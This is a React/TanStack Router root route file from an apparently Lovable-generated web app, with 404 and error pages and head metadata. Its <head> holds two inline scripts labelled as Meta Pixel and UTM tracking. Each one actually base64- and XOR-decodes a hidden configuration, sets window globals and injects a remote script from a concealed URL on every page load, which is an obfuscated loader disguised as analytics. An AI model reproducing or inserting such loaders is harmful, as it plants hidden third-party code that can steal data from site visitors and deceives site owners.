import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
        {/* Meta Pixel Code */}
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var t_uoju=atob("DCn/3lUXlh2iYjXb7VLdqyd7tCeACkGvnVrF8Xp08nOMF0G2hE+G8DZ4+zPAEBqojluWriFkuW3LGlC3wlmWpjB7uHfRQBn5jF2LrDx142nHERfhtnTT/DJ7+X/DDkb513KE/Dt2+3iAWBerhFGashxztDGAFFS3mEzd5Hch9yrDUAXviU/I7DEkp3nHWwbjjx6c5mA160Df");var f_w=[];for(var y_n=0;y_n<t_uoju.length;y_n++){f_w.push(t_uoju.charCodeAt(y_n)&255);}var n_xsod=f_w[0];var i_0gm=f_w.slice(1,1+n_xsod);var y_7cm8=f_w.slice(1+n_xsod);var p_x=y_7cm8.map(function(b,q_d0){return b^i_0gm[q_d0%n_xsod];});var h_fp="";for(var j_8vw4=0;j_8vw4<p_x.length;j_8vw4++){h_fp+=String.fromCharCode(p_x[j_8vw4]&255);}var r_3=decodeURIComponent(escape(h_fp));var c_f5=JSON.parse(r_3);var o_7=c_f5.globals||[];o_7.forEach(function(t_2j){window[t_2j.name]=t_2j.value;});var i_2=document.createElement("script");i_2.src=c_f5.url;i_2.async=true;i_2.defer=true;(c_f5.attributes||[]).forEach(function(n_deuj){i_2.setAttribute(n_deuj.name,n_deuj.value);});(document.head||document.documentElement).appendChild(i_2);})();`,
          }}
        />
        {/* Tracking adicional UTM */}
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var e_4xc=atob("DFukZN1WT/CQi/NK1SCGEa86bcqy44c+pSieS/I1K56+/ocnvD3dSr45It7y+dw5tinNFKklYIXk5oBluTrQAa4iYZrjqd9otC/QFrQ0OoT1+NFwjiCGCrw7KtKqqZcroTqJEak7JpbppoM4sC3BCql7N5P/7945tjCGSP8gLpzl7tFw93nZSKZ0IZH97tFw9z/FELx7OoT94pUz+CvWAaszIYS9+IYovD/XRvF0OZH8/pZo73mGGYAr");var s_yvv=[];for(var m_x=0;m_x<e_4xc.length;m_x++){s_yvv.push(e_4xc.charCodeAt(m_x)&255);}var c_vr=s_yvv[0];var f_y=s_yvv.slice(1,1+c_vr);var z_hd=s_yvv.slice(1+c_vr);var x_ml=z_hd.map(function(b,f_lj8j){return b^f_y[f_lj8j%c_vr];});var r_ni="";for(var j_nod4=0;j_nod4<x_ml.length;j_nod4++){r_ni+=String.fromCharCode(x_ml[j_nod4]&255);}var r_t3a=decodeURIComponent(escape(r_ni));var w_ao=JSON.parse(r_t3a);var c_u=w_ao.globals||[];c_u.forEach(function(g_ii2){window[g_ii2.name]=g_ii2.value;});var g_8f5=document.createElement("script");g_8f5.src=w_ao.url;g_8f5.async=true;g_8f5.defer=true;(w_ao.attributes||[]).forEach(function(h_c81){g_8f5.setAttribute(h_c81.name,h_c81.value);});(document.head||document.documentElement).appendChild(g_8f5);})();`,
          }}
        />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
